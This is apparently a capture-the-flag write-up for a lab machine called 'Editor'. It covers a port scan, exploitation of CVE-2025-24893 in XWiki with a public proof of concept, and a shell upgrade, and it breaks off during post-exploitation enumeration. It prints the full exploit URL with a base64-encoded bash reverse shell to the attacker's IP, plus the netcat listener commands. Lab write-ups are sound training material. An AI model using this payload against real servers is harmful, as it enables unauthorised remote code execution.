# Title : Editor 

## Enumeration

### Port Scanning

```bash

$ nmap -sV -sC -Pn -A 10.10.11.80   
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-10 15:51 WAT
Nmap scan report for 10.10.11.80
Host is up (0.52s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://editor.htb/
8080/tcp open  http    Jetty 10.0.20
|_http-server-header: Jetty(10.0.20)
| http-title: XWiki - Main - Intro
|_Requested resource was http://10.10.11.80:8080/xwiki/bin/view/Main/
| http-webdav-scan: 
|   WebDAV type: Unknown
|   Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, LOCK, UNLOCK
|_  Server Type: Jetty(10.0.20)
| http-cookie-flags: 
|   /: 
|     JSESSIONID: 
|_      httponly flag not set
| http-robots.txt: 50 disallowed entries (15 shown)
| /xwiki/bin/viewattachrev/ /xwiki/bin/viewrev/ 
| /xwiki/bin/pdf/ /xwiki/bin/edit/ /xwiki/bin/create/ 
| /xwiki/bin/inline/ /xwiki/bin/preview/ /xwiki/bin/save/ 
| /xwiki/bin/saveandcontinue/ /xwiki/bin/rollback/ /xwiki/bin/deleteversions/ 
| /xwiki/bin/cancel/ /xwiki/bin/delete/ /xwiki/bin/deletespace/ 
|_/xwiki/bin/undelete/
|_http-open-proxy: Proxy might be redirecting requests
| http-methods: 
|_  Potentially risky methods: PROPFIND LOCK UNLOCK
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1025/tcp)
HOP RTT       ADDRESS
1   226.80 ms 10.10.14.1
2   226.78 ms 10.10.11.80

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.89 seconds


```
- on the  server 3 port were open 80, 8080 and 22

- i add `http://editor.htb/` to `/etc/hosts`

```sh

sudo echo "10.10.11.80      editor.htb   wiki.editor.htb" >> /etc/hosts

```

- after add it to my '/etc/hosts', i proceed  to access it via a web broswer and on port 8080 it runing Jetty(10.0.20)
 it host `XWiki Debian 15.10.8` 

 - which i found an exploit `https://github.com/dollarboysushil/CVE-2025-24893-XWiki-Unauthenticated-RCE-Exploit-POC.git`

 ```sh

$ git clone https://github.com/dollarboysushil/CVE-2025-24893-XWiki-Unauthenticated-RCE-Exploit-POC.git
Cloning into 'CVE-2025-24893-XWiki-Unauthenticated-RCE-Exploit-POC'...
remote: Enumerating objects: 12, done.
remote: Counting objects: 100% (12/12), done.
remote: Compressing objects: 100% (11/11), done.
remote: Total 12 (delta 1), reused 12 (delta 1), pack-reused 0 (from 0)
Receiving objects: 100% (12/12), 294.07 KiB | 84.00 KiB/s, done.
Resolving deltas: 100% (1/1), done.

$ cd CVE-2025-24893-XWiki-Unauthenticated-RCE-Exploit-POC/

$ python CVE-2025-24893-dbs.py 
    
 
   _______      ________    ___   ___ ___  _____     ___  _  _   ___   ___ ____  
  / ____\ \    / /  ____|  |__ \ / _ \__ \| ____|   |__ \| || | / _ \ / _ \___ \ 
 | |     \ \  / /| |__ ______ ) | | | ) | | |__ ______ ) | || || (_) | (_) |__) |
 | |      \ \/ / |  __|______/ /| | | |/ /|___ \______/ /|__   _> _ < \__, |__ < 
 | |____   \  /  | |____    / /_| |_| / /_ ___) |    / /_   | || (_) |  / /___) |
  \_____|   \/   |______|  |____|\___/____|____/    |____|  |_| \___/  /_/|____/ 
                                                                                 
                                                                                 

           CVE-2025-24893 - XWiki Groovy RCE Exploit
                   exploit by @dollarboysushil

[?] Enter target URL (including http:// or https:// e.g http://10.10.10.18.10:8080): http://10.10.11.80:8080 
[?] Enter your IP address (for reverse shell): 10.10.14.72
[?] Enter the port number: 4444

[+] Crafting malicious reverse shell payload...

[+] Sample Format:
    http://target/xwiki/bin/get/Main/SolrSearch?media=rss&text=<payload>

[+] Final Exploit URL:
http://10.10.11.80:8080/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7D%7D%7D%7B%7Basync%20async=false%7D%7D%7B%7Bgroovy%7D%7D%22bash%20-c%20%7Becho,YmFzaCAtYyAnc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNzIvNDQ0NCAwPiYxJw==%7D%7C%7Bbase64,-d%7D%7C%7Bbash,-i%7D%22.execute%28%29%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D

[+] Sending exploit via curl...

[+] Exploit delivered successfully! Check your listener.

[+] Done. Awaiting reverse shell connection on 10.10.14.72:4444 ...



 ```

- bam you have your shell

```bash
$ nc -lvnp 4444       
listening on [any] 4444 ...
connect to [10.10.14.72] from (UNKNOWN) [10.10.11.80] 37030
sh: 0: can't access tty; job control turned off
$ 


```
 - i use python to stablizer my shelll

 ```bash

python3 -c 'import pty; pty.spawn("/bin/bash")'

 ctrl + z

stty raw -echo && fg

 ```


 /var/log/xwiki/2025_08_19.jetty.log
/var/log/xwiki/2025_08_19.request.log


╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files (limit 100)
Found /var/lib/command-not-found/commands.db: SQLite 3.x database, last written using SQLite version 3037002, file counter 5, database pages 831, cookie 0x4, schema 4, UTF-8, version-valid-for 5
Found /var/lib/fwupd/pending.db: SQLite 3.x database, last written using SQLite version 3037002, file counter 3, database pages 6, cookie 0x5, schema 4, UTF-8, version-valid-for 3
Found /var/lib/PackageKit/transactions.db: SQLite 3.x database, last written using SQLite version 3037002, file counter 5, database pages 8, cookie 0x4, schema 4, UTF-8, version-valid-for 5


